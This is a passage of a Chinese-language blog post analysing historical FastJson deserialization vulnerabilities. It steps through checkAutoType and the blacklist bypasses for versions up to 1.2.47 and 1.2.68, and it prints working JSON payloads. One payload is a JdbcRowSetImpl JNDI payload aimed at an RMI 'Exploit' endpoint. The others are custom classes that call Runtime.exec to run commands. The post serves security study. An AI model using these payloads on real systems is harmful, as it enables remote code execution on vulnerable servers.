51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 public Class\u003c?\u003e checkAutoType(String typeName, Class\u003c?\u003e expectClass, int features) { // 类名非空判断 if (typeName == null) { return null; } // 类名长度判断，不大于128不小于3 if (typeName.length() \u003e= 128 || typeName.length() \u003c 3) { throw new JSONException(\"autoType is not support. \" + typeName); } String className = typeName.replace('$', '.'); Class\u003c?\u003e clazz = null; final long BASIC = 0xcbf29ce484222325L; //; final long PRIME = 0x100000001b3L; //L final long h1 = (BASIC ^ className.charAt(0)) * PRIME; // 类名以 [ 开头抛出异常 if (h1 == 0xaf64164c86024f1aL) { // [ throw new JSONException(\"autoType is not support. \" + typeName); } // 类名以 L 开头以 ; 结尾抛出异常 if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) { throw new JSONException(\"autoType is not support. \" + typeName); } final long h3 = (((((BASIC ^ className.charAt(0)) * PRIME) ^ className.charAt(1)) * PRIME) ^ className.charAt(2)) * PRIME; // autoTypeSupport 为 true 时，先对比 acceptHashCodes 加载白名单项 if (autoTypeSupport || expectClass != null) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { hash ^= className.charAt(i); hash *= PRIME; if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); if (clazz != null) { return clazz; } } // 在对比 denyHashCodes 进行黑名单匹配 // 如果黑名单有匹配并且 TypeUtils.mappings 里没有缓存这个类 // 则抛出异常 if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0 \u0026\u0026 TypeUtils.getClassFromMapping(typeName) == null) { throw new JSONException(\"autoType is not support. \" + typeName); } } } // 尝试在 TypeUtils.mappings 中查找缓存的 class if (clazz == null) { clazz = TypeUtils.getClassFromMapping(typeName); } // 尝试在 deserializers 中查找这个类 if (clazz == null) { clazz = deserializers.findClass(typeName); } // 如果找到了对应的 class，则会进行 return if (clazz != null) { if (expectClass != null \u0026\u0026 clazz != java.util.HashMap.class \u0026\u0026 !expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } // 如果没有开启 AutoTypeSupport ，则先匹配黑名单，在匹配白名单，与之前逻辑一致 if (!autoTypeSupport) { long hash = h3; for (int i = 3; i \u003c className.length(); ++i) { char c = className.charAt(i); hash ^= c; hash *= PRIME; if (Arrays.binarySearch(denyHashCodes, hash) \u003e= 0) { throw new JSONException(\"autoType is not support. \" + typeName); } if (Arrays.binarySearch(acceptHashCodes, hash) \u003e= 0) { if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (expectClass != null \u0026\u0026 expectClass.isAssignableFrom(clazz)) { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } return clazz; } } } // 如果 class 还为空，则使用 TypeUtils.loadClass 尝试加载这个类 if (clazz == null) { clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false); } if (clazz != null) { if (TypeUtils.getAnnotation(clazz,JSONType.class) != null) { return clazz; } if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver ) { throw new JSONException(\"autoType is not support. \" + typeName); } if (expectClass != null) { if (expectClass.isAssignableFrom(clazz)) { return clazz; } else { throw new JSONException(\"type not match. \" + typeName + \" -\u003e \" + expectClass.getName()); } } JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy); if (beanInfo.creatorConstructor != null \u0026\u0026 autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } } final int mask = Feature.SupportAutoType.mask; boolean autoTypeSupport = this.autoTypeSupport || (features \u0026 mask) != 0 || (JSON.DEFAULT_PARSER_FEATURE \u0026 mask) != 0; if (!autoTypeSupport) { throw new JSONException(\"autoType is not support. \" + typeName); } return clazz; } 由以上代码可知，这里存在一个逻辑问题：autoTypeSupport 为 true 时，fastjson 会禁止一些黑名单的类反序列化，但是有一个判断条件：当反序列化的类在黑名单中，且 TypeUtils.mappings 中没有该类的缓存时，才会抛出异常。这里就留下了一个伏笔。就是这个逻辑导致了 1.2.32 之前的版本将会受到 autoTypeSupport 的影响。\n在 autoTypeSupport 为默认的 false 时，程序直接检查黑名单并抛出异常，在这部分我们无法绕过，所以我们的关注点就在判断之前，程序有在 TypeUtils.mappings 中和 deserializers 中尝试查找要反序列化的类，如果找到了，则就会 return，这就避开下面 autoTypeSupport 默认为 false 时的检查。如何才能在这两步中将我们的恶意类加载进去呢？\n先看 deserializers ，位于 com.alibaba.fastjson.parser.ParserConfig.deserializers ，是一个 IdentityHashMap，能向其中赋值的函数有：\ngetDeserializer()：这个类用来加载一些特定类，以及有 JSONType 注解的类，在 put 之前都有类名及相关信息的判断，无法为我们所用。 initDeserializers()：无入参，在构造方法中调用，写死一些认为没有危害的固定常用类，无法为我们所用。 putDeserializer()：被前两个函数调用，我们无法控制入参。 因此我们无法向 deserializers 中写入值，也就在其中读出我们想要的恶意类。所以我们的目光转向了 TypeUtils.getClassFromMapping(typeName)。\n同样的，这个方法从 TypeUtils.mappings 中取值，这是一个 ConcurrentHashMap 对象，能向其中赋值的函数有：\naddBaseClassMappings()：无入参，加载 loadClass()：关键函数 接下来看一下 loadClass() 的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 public static Class\u003c?\u003e loadClass(String className, ClassLoader classLoader, boolean cache) { // 非空判断 if(className == null || className.length() == 0){ return null; } // 防止重复添加 Class\u003c?\u003e clazz = mappings.get(className); if(clazz != null){ return clazz; } // 判断 className 是否以 [ 开头 if(className.charAt(0) == '['){ Class\u003c?\u003e componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); } // 判断 className 是否 L 开头 ; 结尾 if(className.startsWith(\"L\") \u0026\u0026 className.endsWith(\";\")){ String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); } try{ // 如果 classLoader 非空，cache 为 true 则使用该类加载器加载并存入 mappings 中 if(classLoader != null){ clazz = classLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ e.printStackTrace(); // skip } // 如果失败，或没有指定 ClassLoader ，则使用当前线程的 contextClassLoader 来加载类，也需要 cache 为 true 才能写入 mappings 中 try{ ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); if(contextClassLoader != null \u0026\u0026 contextClassLoader != classLoader){ clazz = contextClassLoader.loadClass(className); if (cache) { mappings.put(className, clazz); } return clazz; } } catch(Throwable e){ // skip } // 如果还是失败，则使用 Class.forName 来获取 class 对象并放入 mappings 中 try{ clazz = Class.forName(className); mappings.put(className, clazz); return clazz; } catch(Throwable e){ // skip } return clazz; } 由以上代码可知，只要我们能够控制这个方法的参数，就可以往 mappings 中写入任意类名。 loadClass 一共有三个重载方法，如下图：\n我们需要找到调用这些方法的类，并看是否能够为我们控制：\nClass\u003c?\u003e loadClass(String className, ClassLoader classLoader, boolean cache)：调用链均在 checkAutoType() 和 TypeUtils 里自调用，略过。 Class\u003c?\u003e loadClass(String className)：除了自调用，有一个 castToJavaBean() 方法，暂未研究。 Class\u003c?\u003e loadClass(String className, ClassLoader classLoader)：方法调用三个参数的重载方法，并添加参数 true ，也就是会加入参数缓存中。 重点看一下两个参数的 loadClass 方法在哪调用：\n在这里我们关注 com.alibaba.fastjson.serializer.MiscCodec#deserialze 方法，这个类是用来处理一些乱七八糟类的反序列化类，其中就包括 Class.class 类，成为了我们的入口。\n如果 parser.resolveStatus 为TypeNameRedirect（值为2） 时，进入 if 语句，会解析 val 中的内容并放入 objVal 中，然后传入 strVal 中。\n后面的逻辑如果 class 是 Class.class 时，将会调用 loadClass 方法，将 strVal 进行类加载并缓存：\n小结 首先要避开checkAutoType()中autoTypeSupport 默认为 false 时的检查，从两个if判断语句入手发现只有TypeUtils.getClassFromMapping(typeName)可能对clazz赋值使用两个参数的loadclass向mapping中赋值MiscCodec#deserialze 方法调用了两个参数的loadclass.调用之前需要满足parser.resolveStatus 为TypeNameRedirect（值为2） 时，其中一个key为 val ，此时会将val的内容放入 objVal 中，然后传入 strVal 中。 接着如果 class 是 Class.class 时，将会调用 loadClass 方法，将 strVal 进行类加载并缓存。\n所以可以将恶意类名存到val中，这就完成了恶意类的加载，可以避开异常的抛出。 如何满足parser.resolveStatus 为TypeNameRedirect（值为2），在后面调试中会讲到\n调试 我们先构造一个 json ：{\"@type\":\"java.lang.Class\",\"val\":\"reus09\"} ，调试一下：\nJSON.parseObject() 调用 DefaultJSONParser 对 JSON 进行解析。\nDefaultJSONParser.parseObject() 调用 checkAutoType() 检查待加载类的合法性。\n由于 deserializers 在初始化时将 Class.class 进行了加载，因此使用 findClass 可以找到，越过了后面 AutoTypeSupport 的检查。\nDefaultJSONParser.parseObject() 设置 resolveStatus 为 2。 DefaultJSONParser.parseObject() 根据不同的 class 类型分配 deserialzer，Class 类型由 MiscCodec.deserialze() 处理。\n解析 json 中 “val” 中的内容，并放入 objVal 中，如果不是 “val” 将会报错。\n传递至 strVal 并使用 loadClass 加载并缓存。\n此时恶意的 val 成功被我们加载到 mappings 中，再次以恶意类进行 @type 请求时即可绕过黑名单进行的阻拦，因此最终 payload 为：\n1 2 3 4 5 6 7 8 9 10 11 { \"reus09\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, \"reus09\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\": true } } 影响版本分析 影响版本：1.2.25 \u003c= fastjson \u003c= 1.2.32 未开启 AutoTypeSupport，才可以被利用 影响版本：1.2.33 \u003c= fastjson \u003c= 1.2.47不论是否开启AutoTypeSupport，都可以被利用。\n两者在checkAutoType实现的逻辑其实差不多，其实就是后者对黑名单识别命中报错的时候，额外加了条件，该类无法从缓存mappings中找到才会报错。\n两者实现原理本质上都是代码执行顺序的绕过。\n1.2.25 \u003c= fastjson \u003c= 1.2.32 autoTypeSupport为true 在该版本中的checkAutoType方法中，如果识别到黑名单里面的类直接报错autoType is not support.\n在名黑单识别后执行才执行getClassFromMapping方法和findClass方法。\n在解析我们的第一段payload的时候\n1 2 3 4 reus09\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.rowset.JdbcRowSetImpl\" }, 因为@type指定的类java.lang.Class不属于黑名单，并且可以在clazz = this.deserializers.findClass(typeName);获得对应的反序列化MiscCodec，在它的deserialze方法中实现了TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader())方法，将对应的val的值加入到mappings里面。\n但是在解析第二段payload 的时候\n1 2 3 4 5 \"reus09\": { \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"rmi://127.0.0.1:1099/Exploit\", \"autoCommit\": true } com.sun.rowset.JdbcRowSetImpl的className还来得及进行mappings的判断，就被黑名单干掉了，报错了。\n因此autoTypeSupport开启的时候，，payload不起效果\nautoTypeSupport为false 如上面的分析一样，如果autoTypeSupport为false，那么在进行if(!autoTypeSupport)前，即执行黑白名单判断前，就会先执行getClassFromMapping方法和findClass方法。\n那么在解析第一段payload的时候，直接就可以通过clazz = this.deserializers.findClass(typeName);获得反序列化器MiscCodec，并将clazz赋为java.lang.class，然后程序因为clazz不为空，直接返回clazz，这样就跳过了黑白名单的审查。然后后续MiscCodec的deserialze方法将val对应的值com.sun.rowset.JdbcRowSetImpl加入到mappings中。\n然后在解析第二段payload的时候，TypeUtils.getClassFromMapping(typeName)直接从mappings中获取缓存的类名，然后直接返回。\n之后的反序列化就不再讲了。\n1.2.33 \u003c= fastjson \u003c= 1.2.47 1.2.33~1.2.47之间的checkAutoType方法和之前的有所改动，只有识别到类在黑名单中并且同时无法从mappings中获取，才会报错autoType is not support。\nautoTypeSupport为true 第一段payload直接通过clazz = this.deserializers.findClass(typeName);，找到反序列化器MiscCodec，然后通过它的deserize方法实现将val的值com.sun.rowset.JdbcRowSetImpl添加到mappings中。\n第二段payload因为com.sun.rowset.JdbcRowSetImpl在mappings中存储着，所以可以直接过黑名单的报错，然后通过clazz = TypeUtils.getClassFromMapping(typeName)获得对应的clazz，最后执行它的反序列化。\nautoTypeSupport为false 利用链和autoTypeSupport为true的情况一样。\n实际上，这个版本的fastJson实现的是对黑名单报错额外加条件(缓存mappings中没有该类)导致的。\nfastjson-1.2.68 在 1.2.47 版本漏洞爆发之后，官方在 1.2.48 对漏洞进行了修复，在 MiscCodec 处理 Class 类的地方，设置了cache 为 false ，并且 loadClass 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。\nMisCodec的deserialze方法中调用TypeUtils.loadClass方法。\nloadClass默认的cache也设置为false\n这个安全修复为 fastjson 带来了一定时间的平静，直到 1.2.68 版本出现了新的漏洞利用方式。\n影响版本：fastjson \u003c= 1.2.68 描述：利用 expectClass 绕过 checkAutoType() ，实际上也是为了绕过安全检查的思路的延伸。主要使用 Throwable 和 AutoCloseable 进行绕过。\n版本 1.2.68 本身更新了一个新的安全控制点 safeMode，如果应用程序开启了 safeMode，将在 checkAutoType() 中直接抛出异常，也就是完全禁止 autoType，不得不说，这是一个一劳永逸的修复方式。\n但与此同时，这个版本报出了一个新的 autoType 开关绕过方式：利用 expectClass 绕过 checkAutoType()。\n在 checkAutoType() 函数中有这样的逻辑：如果函数有 expectClass 入参，且我们传入的类名是 expectClass 的子类或实现，并且不在黑名单中，就可以通过 checkAutoType() 的安全检测。(isAssignableFrom(clazz) 判定此 Class 对象所表示的类或接口与指定的 Class 参数所表示的类或接口是否相同，或是否是其超类或超接口)。\n接下来我们找一下 checkAutoType() 几个重载方法是否有可控的 expectClass 的入参方式，最终找到了以下几个类：\nThrowableDeserializer#deserialze() JavaBeanDeserializer#deserialze() ThrowableDeserializer利用 如果传入的是java.lang.Throwable类，那么其对应的反序列化解析器为ThrowableDeserializer。\nThrowableDeserializer#deserialze() 方法直接将 @type 后的类传入 checkAutoType() ，并且 expectClass 为 Throwable.class。\n通过 checkAutoType() 之后，将使用 createException 来创建异常类的实例。\n这就形成了 Throwable 子类绕过 checkAutoType() 的方式。我们需要找到 Throwable 的子类，这个类的 getter/setter/static block/constructor 中含有具有威胁的代码逻辑。\n因为Throwable类既没有在黑白名单里面，也不在缓存里面，所以我们不能直接指定ExpectClas为Throwable\njava.lang.Exception继承了Throwable类，并且也在mappings中的缓存。\n这里我们自定义实现了一个继承了Throwable类的子类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package com.reus09.Evil; import java.io.IOException; /** * @ClassName ExecException * @Description TODO * @Author reus09 * @Date 2023/4/20 01:08 * @Version 1.0 **/ public class ExecThrowable extends Throwable{ private String domain; public(String domain){ try { Runtime.getRuntime().exec(domain); } catch (IOException e) { e.printStackTrace(); } } public String getDomain() { return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public String getMessage() { return super.getMessage(); } } 我们的Poc如下：\n1 2 3 4 5 { \"@type\":\"java.lang.Exception\", \"@type\": \"com.reus09.Evil.ExecThrowable\", \"domain\": \"open /System/Applications/Calculator.app\" } 调试 第一次是传入java.lang.Exception类进行校验，这里CheckAutoType()函数的expectClass参数是为null的：\n接着直接从缓冲mappings中获取到了java.lang.Exception类\n然后判断clazz是否 不是expectClass类的继承类且不是HashMap类型，是的话抛出异常，否则直接返回该类。这里没有expectClass就直接返回java.lang.Exception类：\n然后回到com.alibaba.fastjson.parser.DefaultJSONParser#parseObject方法，因为我们的java.lang.Exception实际上是Throwable类的子类，所以它的反序列化器为ThrowableDeserializer。然后调用ThrowableDeserializer的deserialize方法。\n在com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze的方法里面，exClassName获取POC中下一个@type指定的ClassName，然后再次调用checkAutoType函数，并且传入的expectClass为Throwable。 com.reus09.Evil.ExecThrowable这个类是我们自定义的，不是黑、白名单上面的类，也不存在缓存mappings中，并且因为传入的expectClass是Throwable类，我们自定义类是Throwable的子类，因此expectClassFlag为true。\n接着会绕过黑白名单的检测，经过autoTypeSupport为true或false的两种情况的检查，由于expectClassFlag为true，进入如下的loadClass()逻辑来加载目标类，由于AutoType关闭且jsonType为false，因此调用loadClass()函数的时候是不开启cache即缓存的：\n使用AppClassLoader来加载com.reus09.Evil.ExecThrowable类并返回。\n接着判断jsonType，如果为true的话直接添加Mapping缓存并返回类，否则接着判断返回的类是否是ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这实现过滤大多数JNDI注入Gadget：\n往下，如果expectClass不为null，则判断目标类是否是expectClass类的子类，是的话就添加到Mapping缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，因此这里恶意类必须要实现Throwable类\ncheckAutoType调用完后，就执行createException函数来创建异常类的实例，在里面反射调用构造函数，然后实例化。实现触发漏洞。\nJavaBeanDeserializer利用 1 2 3 4 5 6 7 if (expectClass == null) { expectClassFlag = false; } else if (expectClass != Object.class \u0026\u0026 expectClass != Serializable.class \u0026\u0026 expectClass != Cloneable.class \u0026\u0026 expectClass != Closeable.class \u0026\u0026 expectClass != EventListener.class \u0026\u0026 expectClass != Iterable.class \u0026\u0026 expectClass != Collection.class) { expectClassFlag = true; }else{ expectClassFlag = false; } 对于这段代码来说，我们需要找到一个符合要求的期望类，不是object、Serializable、Cloneable、Closeable、EventListener、Iterable、Collection这些类，并且他也不能在黑名单里面https://github.com/LeadroyaL/fastjson-blacklist，并且这个类需要在缓存mappings中，找到了java.lang.AutoCloseable和java.util.BitSet两个接口。\n这里我们自定义实现了一个继承了AutoCloseable类的子类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 package com.reus09.Evil; import java.io.Closeable; import java.io.IOException; /** * @ClassName ExecCloseable * @Description TODO * @Author reus09 * @Date 2023/4/20 00:09 * @Version 1.0 **/ public class ExecCloseable implements AutoCloseable { private String domain; public String getDomain() { try { Runtime.getRuntime().exec(domain); } catch (IOException e) { e.printStackTrace(); } return domain; } public void setDomain(String domain) { this.domain = domain; } @Override public void close() throws IOException { } } POC如下：\n1 2 3 4 5 { \"@type\":\"java.lang.AutoCloseable\", \"@type\": \"com.reus09.Evil.ExecCloseable\", \"domain\": \"open /System/Applications/Calculator.app\" } 调试 第一次进入CheckAutoType()函数的执行逻辑和前面讲到的java.lang.Exception处理逻辑是一样的，同样是在mappings中获取\n后面逻辑差不多，获得clazz之后，然后回到com.alibaba.fastjson.parser.DefaultJSONParser#parseObject方法，然后调用ParserConfig#getDeserializer方法来获得反序列化器，因为AutoCloseable不满足上述类的获得反序列化器的条件，所以到了最后一步通过ParserConfig#createJavaBeanDeserializer 方法来构造 JavaBeanDeserializer对象。\n之后就调用JavaBeanDeserializer的deserialze方法，\n在 deserialze() 方法中又做了一次 checkAutoType 检测，此处直接将第二个 @type 的类名，和前面构造 JavaBeanDeserializer 对象时指定的期望类直接传了进来。\n然后就和在ThrowableDeserializer的步骤差不多，来到expectClass不为空的情况，将恶意类添加到mappings里面，然后返回clazz。\ncheckAutoType()调用完返回类之后，然后再次获得 JavaBeanDeserializer反序列化器，在它的deserialze方法中，最终调用com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance()通过代理实例化恶意类实例进而调用其构造函数从而成功触发漏洞。\nfastjson-1.2.80 见之前文章。\n总结 经过上面的分析，我们直到如果想要通过checkAutoType的检验，有以下几种方法:\n传入的类在白名单中 开启了autotype(autoTypeSupport is true) 使用了JSONType注解(如:fastjson.annotation.JSONType) 某些期望类 (继承于expectClass) 要反序列化的类在cache中 (TypeUtils.mappings列表中有 @type 指定的类) 但具体可以操作的路线、攻击链感觉还是要对代码有足够的熟练掌握。\n总的来说，感觉fastjson漏洞的利用大部分都是一些逻辑上的代码问题，同时也是黑客巧妙的攻击链构造。\n最后，学习到了一些FastJson反序列化的基本原理，之前都是云里雾里，不知其所以然。此外，对FastJson的parse、parseObject相关方法的区别。还有就是发现现在写博客往往都是对别人的文章大抄特抄，自己的东西、思考太少了，为什么要这样写?为什么这么思考?以后还是需要努力。\nReference https://su18.org/post/fastjson/#1-fastjson-1224 http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/ https://www.yang99.top/index.php/archives/71/ https://paper.seebug.org/1192/#comsunrowsetjdbcrowsetimpl https://juejin.cn/post/6846687594130964488#heading-3 https://blog.csdn.net/hosaos/article/details/106982555 ",
  "wordCount" : "16109",
  "inLanguage": "en",
  "datePublished": "2022-10-12T14:04:36+08:00",
  "dateModified": "2022-10-12T14:04:36+08:00",
  "author":[{
    "@type": "Person",
    "name": "Reus09"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Reus09's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="" accesskey="h" title="Reus09&#39;s Blog (Alt + H)">Reus09&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="archives/" title="Archives">
                    <span>Archives</span>
                </a>
            </li>
            <li>
                <a href="categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="about" title="About">
                    <span>About</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="">Home</a>&nbsp;»&nbsp;<a href="/posts/">📚文章</a>&nbsp;»&nbsp;<a href="/posts/tech/">👨🏻‍💻技术</a></div>
    <h1 class="post-title">
      FastJson反序列化漏洞总结
    </h1>
    <div class="post-meta"><span title='2022-10-12 14:04:36 +0800 +0800'>2022-10-12</span>&nbsp;·&nbsp;33 min&nbsp;·&nbsp;Reus09

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" aria-label="漏洞介绍">漏洞介绍</a></li>
                    <li>
                        <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%96%b9%e6%b3%95" aria-label="反序列化方法">反序列化方法</a></li>
                    <li>
                        <a href="#fastjson-1224%e5%88%86%e6%9e%90" aria-label="FastJson 1.2.24分析"><code>FastJson 1.2.24</code>分析</a><ul>
                            
                    <li>
                        <a href="#templatesimpl-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="TemplatesImpl 反序列化"><code>TemplatesImpl</code> 反序列化</a></li>
                    <li>
                        <a href="#jdbcrowsetimpl--%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="JdbcRowSetImpl 反序列化"><code>JdbcRowSetImpl </code> 反序列化</a></li></ul>
                    </li>
                    <li>
                        <a href="#autotype%e4%b8%8echeckautotype" aria-label="AutoType与checkAutoType">AutoType与checkAutoType</a></li>
                    <li>
                        <a href="#%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" aria-label="历史漏洞分析">历史漏洞分析</a><ul>
                            
                    <li>
                        <a href="#fastjson-1225" aria-label="fastjson-1.2.25">fastjson-1.2.25</a></li>
                    <li>
                        <a href="#fastjson-1242" aria-label="fastjson-1.2.42">fastjson-1.2.42</a></li>
                    <li>
                        <a href="#fastjson-1243" aria-label="fastjson-1.2.43">fastjson-1.2.43</a></li>
                    <li>
                        <a href="#fastjson-1244" aria-label="fastjson-1.2.44">fastjson-1.2.44</a></li>
                    <li>
                        <a href="#fastjson-1245" aria-label="fastjson-1.2.45">fastjson-1.2.45</a></li>
                    <li>
                        <a href="#fastjson-1247" aria-label="fastjson-1.2.47">fastjson-1.2.47</a><ul>
                            
                    <li>
                        <a href="#%e5%88%86%e6%9e%90" aria-label="分析">分析</a></li>
                    <li>
                        <a href="#%e5%b0%8f%e7%bb%93" aria-label="小结">小结</a></li>
                    <li>
                        <a href="#%e8%b0%83%e8%af%95" aria-label="调试">调试</a></li>
                    <li>
                        <a href="#%e5%bd%b1%e5%93%8d%e7%89%88%e6%9c%ac%e5%88%86%e6%9e%90" aria-label="影响版本分析">影响版本分析</a><ul>
                            
                    <li>
                        <a href="#1225--fastjson--1232" aria-label="1.2.25 &amp;lt;= fastjson &amp;lt;= 1.2.32">1.2.25 &lt;= fastjson &lt;= 1.2.32</a><ul>
                            
                    <li>
                        <a href="#autotypesupport%e4%b8%batrue" aria-label="autoTypeSupport为true">autoTypeSupport为true</a></li>
                    <li>
                        <a href="#autotypesupport%e4%b8%bafalse" aria-label="autoTypeSupport为false">autoTypeSupport为false</a></li></ul>
                    </li>
                    <li>
                        <a href="#1233--fastjson--1247" aria-label="1.2.33 &amp;lt;= fastjson &amp;lt;= 1.2.47">1.2.33 &lt;= fastjson &lt;= 1.2.47</a><ul>
                            
                    <li>
                        <a href="#autotypesupport%e4%b8%batrue-1" aria-label="autoTypeSupport为true">autoTypeSupport为true</a></li>
                    <li>
                        <a href="#autotypesupport%e4%b8%bafalse-1" aria-label="autoTypeSupport为false">autoTypeSupport为false</a></li></ul>
                    </li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#fastjson-1268" aria-label="fastjson-1.2.68">fastjson-1.2.68</a><ul>
                            
                    <li>
                        <a href="#throwabledeserializer%e5%88%a9%e7%94%a8" aria-label="ThrowableDeserializer利用">ThrowableDeserializer利用</a><ul>
                            
                    <li>
                        <a href="#%e8%b0%83%e8%af%95-1" aria-label="调试">调试</a></li></ul>
                    </li>
                    <li>
                        <a href="#javabeandeserializer%e5%88%a9%e7%94%a8" aria-label="JavaBeanDeserializer利用">JavaBeanDeserializer利用</a><ul>
                            
                    <li>
                        <a href="#%e8%b0%83%e8%af%95-2" aria-label="调试">调试</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#fastjson-1280" aria-label="fastjson-1.2.80">fastjson-1.2.80</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a></li>
                    <li>
                        <a href="#reference" aria-label="Reference">Reference</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
         
         activeElement = elements[0];
         const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
         document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
     }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 && 
